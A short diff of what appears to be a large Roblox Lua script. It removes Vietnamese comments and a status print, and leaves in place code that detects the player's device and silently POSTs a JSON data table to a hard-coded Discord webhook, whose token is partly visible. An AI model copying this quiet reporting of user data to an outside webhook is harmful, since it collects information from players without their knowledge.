@@ -9381,7 +9381,6 @@ local webhookURL = "https://discord.com/api/webhooks/1336239884209229849/17Du6Jc
 
 local userInputService = game:GetService("UserInputService")
 
--- Kiểm tra thiết bị
 local deviceType = "PC"
 if userInputService.TouchEnabled then
     deviceType = "Mobile"
@@ -9402,13 +9401,9 @@ local data = {
 
 local jsonData = game:GetService("HttpService"):JSONEncode(data)
 
--- Sử dụng RequestAsync để gửi webhook
 local response = game:GetService("HttpService"):RequestAsync({
     Url = webhookURL,
     Method = "POST",
     Headers = { ["Content-Type"] = "application/json" },
     Body = jsonData
 })
-
--- Kiểm tra phản hồi
-print(response.StatusCode)
